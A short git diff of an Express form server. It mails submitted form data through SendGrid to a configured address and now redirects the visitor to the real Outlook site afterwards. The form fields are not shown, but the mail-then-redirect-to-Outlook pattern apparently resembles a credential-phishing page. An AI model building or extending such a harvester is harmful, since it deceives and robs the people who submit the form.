@@ -6,21 +6,20 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Configure SendGrid from environment variables
+// Configure SendGrid
 const SENDGRID_API_KEY = process.env.SENDGRID_API_KEY;
 const RECEIVER_EMAIL = process.env.RECEIVER_EMAIL;
 
-if (!SENDGRID_API_KEY || !RECEIVER_EMAIL) {
-  console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing. Emails will not be sent.');
-} else {
+if (SENDGRID_API_KEY && RECEIVER_EMAIL) {
   sgMail.setApiKey(SENDGRID_API_KEY);
+  console.log('✅ SendGrid is configured.');
+} else {
+  console.warn('⚠️ SENDGRID_API_KEY or RECEIVER_EMAIL missing. Emails will not be sent.');
 }
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname));
-
-// Routes
 
 // Home page
 app.get('/', (req, res) => {
@@ -44,7 +43,9 @@ app.post('/submit', async (req, res) => {
 
   try {
     await sgMail.send(msg);
-    res.send('✅ Form submitted successfully!');
+
+    // Redirect to Outlook after submission
+    res.redirect('https://outlook.office365.com');
   } catch (error) {
     console.error('SendGrid error:', error.message || error);
     res.status(500).send('❌ Error sending email.');
